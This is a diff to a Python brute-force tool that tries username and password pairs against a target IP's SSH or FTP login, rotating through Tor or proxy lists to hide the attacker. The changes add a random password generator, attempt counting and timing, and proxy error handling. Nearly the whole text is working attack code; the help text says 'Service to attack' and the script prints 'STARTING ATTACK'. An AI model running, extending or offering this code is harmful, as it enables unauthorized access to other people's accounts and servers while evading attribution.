@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 
+
 import argparse
 import time
 import paramiko
@@ -8,7 +9,10 @@ from colorama import Fore, init
 import requests
 import socks
 import socket
-
+import random
+import string
+import os
+import tempfile
 
 init(autoreset=True)
 
@@ -16,6 +20,19 @@ init(autoreset=True)
 def current_timestamp():
     return f"{Fore.WHITE}[{Fore.YELLOW}{time.strftime('%H:%M:%S', time.localtime())}{Fore.WHITE}]{Fore.RESET}"
 
+def generate_random_password_list(num_passwords=100000):
+    characters = string.ascii_letters + string.digits + string.punctuation
+    passwords = set()
+
+    while len(passwords) < num_passwords:
+        password = ''.join(random.choice(characters) for i in range(random.randint(8, 16)))
+        passwords.add(password)
+
+    # Save to a temporary file and return its name
+    with tempfile.NamedTemporaryFile(delete=False, mode='w') as tmp:
+        for password in passwords:
+            tmp.write(password + "\n")
+        return tmp.name
 
 def set_up_tor():
     print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} INITIALIZING TOR PROXY...")
@@ -65,6 +82,7 @@ def parse_arguments():
     parser.add_argument('--service', required=True, choices=['ftp', 'ssh'],
                         help="Service to attack. Choose 'ftp' or 'ssh'.")
     parser.add_argument('-w', '--wordlist', required=True, help="Password Wordlist.")
+    parser.add_argument('-r', '--rand', action='store_true', help="Use a random password between 8 and 16 characters.")
     parser.add_argument('-u', '--users', required=True, help="File containing a list of usernames.")
     parser.add_argument('--ip', required=True, type=str, help="IP address of the target.")
     parser.add_argument('--tor', action='store_true', help="Use Tor for anonymization")
@@ -98,7 +116,12 @@ def ssh_attack(ip, user, password, proxy_ip=None, proxy_port=None):
     except paramiko.AuthenticationException:
         return False
     except (socket.timeout, paramiko.SSHException):
-        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Proxy {proxy_ip}:{proxy_port} failed.")
+        if proxy_ip and proxy_port:
+            print(
+                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Proxy {proxy_ip}:{proxy_port} failed.")
+        else:
+            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} SSH Connection failed.")
+
         return None
     except socket.error as e:
         if 'Connection reset by peer' in str(e):
@@ -132,7 +155,12 @@ def ftp_attack(ip, user, password, proxy_ip=None, proxy_port=None):
             print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} FTP error: {e}")
             return False
     except socket.error:
-        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Proxy {proxy_ip}:{proxy_port} failed.")
+        if proxy_ip and proxy_port:
+            print(
+                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Proxy {proxy_ip}:{proxy_port} failed.")
+        else:
+            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} FTP Connection failed.")
+
         return None
 
 
@@ -159,8 +187,14 @@ def load_proxies_from_file(filename):
 if __name__ == '__main__':
     try:
         print(current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} STARTING ATTACK...")
+        start_time = time.time()
+        attempt_count = 0
+
         time.sleep(0.5)
         args = parse_arguments()
+
+        if args.rand:
+            args.wordlist = generate_random_password_list()  
 
         if args.tor and args.proxies:
             print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} You cannot use both Tor and a proxy file at the same time!")
@@ -174,18 +208,18 @@ if __name__ == '__main__':
             print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Loading proxies from file ....")
             proxies = load_proxies_from_file(args.proxies)
 
-        passwords = [line.strip() for line in open(args.wordlist, 'r', encoding='latin-1').readlines()]
-        users = [line.strip() for line in open(args.users, 'r', encoding='latin-1').readlines()]
+        passwords = [line.strip() for line in open(args.wordlist, 'r').readlines()]
+        users = [line.strip() for line in open(args.users, 'r').readlines()]
 
         password_chunk_size = 3
         first_iteration = True
-
+        proxy_gen = None
         if proxies:
-            proxy_gen = cycle_through_proxies(proxies)  # Initialize the proxy generator
+            proxy_gen = cycle_through_proxies(proxies)  
 
         for i in range(0, len(passwords), password_chunk_size):
             for idx, user in enumerate(users):
-                proxy_ip, proxy_port = next(proxy_gen) if proxies else (None, None)
+                proxy_ip, proxy_port = next(proxy_gen) if proxy_gen else (None, None)
 
                 if proxy_ip:
                     print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Using proxy {proxy_ip}:{proxy_port}")
@@ -201,15 +235,18 @@ if __name__ == '__main__':
                         break
                     password = passwords[i + j]
                     print(current_timestamp(), f"Trying user [*]{Fore.YELLOW}{user}{Fore.RESET}[*] with password: {Fore.YELLOW}{password}")
-
+                    attempt_count += 1
+                    time_elapsed = time.time() - start_time
                     if args.service == 'ssh':
                         if handle_timeout(ssh_attack, args.ip, user, password, proxy_ip, proxy_port):
-                            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for {Fore.RESET} [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN} {password}")
+                            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for {Fore.RESET}[*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN} {password} {Fore.RESET}in {time_elapsed:.2f} seconds with {attempt_count} tries.")
+
                             users.remove(user)
                             break
                     elif args.service == 'ftp':
                         if handle_timeout(ftp_attack, args.ip, user, password, proxy_ip, proxy_port):
-                            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for {Fore.RESET}[*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN} {password}")
+                            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for {Fore.RESET}[*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN} {password} {Fore.RESET}in {time_elapsed:.2f} seconds with {attempt_count} tries.")
+
                             users.remove(user)
                             break
 
@@ -223,3 +260,6 @@ if __name__ == '__main__':
     except EOFError:
         print("\n", current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Unexpected End of File (EOF) encountered. Exiting.")
         exit(1)
+
+if args.rand:
+    os.remove(args.wordlist)  
